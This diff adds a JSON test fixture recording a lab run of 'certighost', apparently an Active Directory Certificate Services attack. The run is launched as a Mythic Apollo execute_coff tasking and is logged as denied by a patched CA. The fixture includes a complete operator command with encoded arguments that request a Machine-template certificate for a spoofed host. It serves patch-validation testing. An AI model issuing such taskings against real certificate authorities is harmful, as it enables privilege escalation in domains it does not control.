@@ -1,0 +1,200 @@
+{
+  "schema_version": "certighost.mythic.evidence/v1",
+  "evidence_mode": "offline_fixture",
+  "scenario": "patched_negative_control",
+  "task": {
+    "schema_version": "certighost.mythic.task/v1",
+    "mode": "describe_only",
+    "external_effects": "none",
+    "victim_write_policy": "forbid",
+    "mythic": {
+      "callback_id": "callback-fixture-001",
+      "agent": "apollo",
+      "agent_version": "fixture-apollo-1.0",
+      "command_name": "execute_coff",
+      "command_version": 3,
+      "adapter": "apollo.execute_coff/v3"
+    },
+    "coff": {
+      "name": "certighost.x64.o",
+      "sha256": "26752802e3f48f8eb1424a15e4bad0d8b879937ba65e2a7339a31087dc803795",
+      "architecture": "x64",
+      "entrypoint": "go",
+      "delivery": "existing_agent_in_memory_cache"
+    },
+    "arguments": {
+      "field_order": [
+        "csr_der",
+        "ca_config",
+        "template",
+        "san_dns",
+        "cdc",
+        "rmd"
+      ],
+      "field_types": [
+        "base64",
+        "base64",
+        "base64",
+        "base64",
+        "base64",
+        "base64"
+      ],
+      "go_buffer_encoding": "base64",
+      "go_buffer_b64": "YwAAAAUAAAAwAwIBABUAAABjYTAxLmxhYi5sb2NhbFxMQUItQ0EHAAAATWFjaGluZREAAABnaG9zdDAxLmxhYi5sb2NhbAsAAAAxMC4xMC4xMC40NA4AAABkYzAxLmxhYi5sb2NhbA==",
+      "go_buffer_sha256": "b9d9e840bb57bf25ca5fba1084392a813982886fdde6806b4d8f8d28e98555d0",
+      "go_buffer_bytes": 103,
+      "apollo_execute_coff_frame_encoding": "hex",
+      "apollo_execute_coff_frame_hex": "6300000005000000300302010015000000636130312e6c61622e6c6f63616c5c4c41422d4341070000004d616368696e651100000067686f737430312e6c61622e6c6f63616c0b00000031302e31302e31302e34340e000000646330312e6c61622e6c6f63616c",
+      "apollo_execute_coff_frame_bytes": 103
+    },
+    "task_payload": {
+      "command": "execute_coff",
+      "params": {
+        "coff_name": "certighost.x64.o",
+        "function_name": "go",
+        "timeout": 30,
+        "coff_arguments": [
+          [
+            "base64",
+            "MAMCAQA="
+          ],
+          [
+            "base64",
+            "Y2EwMS5sYWIubG9jYWxcTEFCLUNB"
+          ],
+          [
+            "base64",
+            "TWFjaGluZQ=="
+          ],
+          [
+            "base64",
+            "Z2hvc3QwMS5sYWIubG9jYWw="
+          ],
+          [
+            "base64",
+            "MTAuMTAuMTAuNDQ="
+          ],
+          [
+            "base64",
+            "ZGMwMS5sYWIubG9jYWw="
+          ]
+        ]
+      }
+    },
+    "operator_command": "execute_coff -Coff certighost.x64.o -Function go -Timeout 30 -Arguments base64:MAMCAQA= base64:Y2EwMS5sYWIubG9jYWxcTEFCLUNB base64:TWFjaGluZQ== base64:Z2hvc3QwMS5sYWIubG9jYWw= base64:MTAuMTAuMTAuNDQ= base64:ZGMwMS5sYWIubG9jYWw="
+  },
+  "identifiers": {
+    "callback_id": "callback-fixture-001",
+    "task_id": "task-fixture-patched-001",
+    "output_ids": [
+      "output-fixture-patched-001",
+      "output-fixture-patched-002"
+    ]
+  },
+  "output_records": [
+    {
+      "output_id": "output-fixture-patched-001",
+      "sequence": 0,
+      "channel": "stderr",
+      "text": "certighost: request not issued (disposition=2 request_id=42 last_status=0x80094800)\n"
+    },
+    {
+      "output_id": "output-fixture-patched-002",
+      "sequence": 1,
+      "channel": "stderr",
+      "text": "certighost: CA message: The request was denied.\n"
+    }
+  ],
+  "victim_filesystem": {
+    "before": {
+      "capture_id": "fs-before-fixture-patched-001",
+      "host": "RA-CA01",
+      "collected_at": "2026-07-27T15:40:00Z",
+      "entries": [
+        {
+          "path": "C:\\ProgramData\\redantonetta\\baseline-sentinel.txt",
+          "kind": "file",
+          "size": 17,
+          "sha256": "d65c9e72ac3d62f837cb9bcc10e38c37e35235f5626f70d48ba22c74de5e3b22"
+        },
+        {
+          "path": "C:\\Windows\\Temp",
+          "kind": "directory",
+          "size": 0,
+          "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        }
+      ]
+    },
+    "after": {
+      "capture_id": "fs-after-fixture-patched-001",
+      "host": "RA-CA01",
+      "collected_at": "2026-07-27T15:41:00Z",
+      "entries": [
+        {
+          "path": "C:\\ProgramData\\redantonetta\\baseline-sentinel.txt",
+          "kind": "file",
+          "size": 17,
+          "sha256": "d65c9e72ac3d62f837cb9bcc10e38c37e35235f5626f70d48ba22c74de5e3b22"
+        },
+        {
+          "path": "C:\\Windows\\Temp",
+          "kind": "directory",
+          "size": 0,
+          "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        }
+      ]
+    }
+  },
+  "observations": {
+    "ca_callback_445": false,
+    "ca_callback_389": false,
+    "certificate_identity_matches_target": false,
+    "certificate_sid_matches_target": false,
+    "target_certificate_absent": true,
+    "patched_build_record_id": "patched-build-fixture-001",
+    "patch_kb_record_id": "patch-kb-fixture-001"
+  },
+  "repeatability": {
+    "snapshot": {
+      "record_id": "snapshot-record-fixture-001",
+      "snapshot_name": "certighost-ca-pre-kb5099540",
+      "created_at": "2026-07-27T15:30:00Z"
+    },
+    "revert": {
+      "record_id": "revert-record-fixture-001",
+      "snapshot_name": "certighost-ca-pre-kb5099540",
+      "post_revert_checks_record_id": "post-revert-checks-fixture-001"
+    },
+    "attempts": [
+      {
+        "attempt_id": "attempt-fixture-vulnerable-001",
+        "scenario": "vulnerable",
+        "classification": "vulnerable_issuance"
+      },
+      {
+        "attempt_id": "attempt-fixture-vulnerable-002",
+        "scenario": "vulnerable",
+        "classification": "vulnerable_issuance"
+      }
+    ]
+  },
+  "cleanup": {
+    "records": [
+      {
+        "record_id": "cleanup-revert-fixture-001",
+        "action": "revert_ca_snapshot",
+        "status": "recorded"
+      },
+      {
+        "record_id": "cleanup-verify-fixture-001",
+        "action": "verify_rollback_baseline",
+        "status": "recorded"
+      }
+    ],
+    "rollback": {
+      "revert_record_id": "cleanup-revert-fixture-001",
+      "post_rollback_checks_record_id": "cleanup-verify-fixture-001",
+      "final_state": "vulnerable_baseline"
+    }
+  }
+}
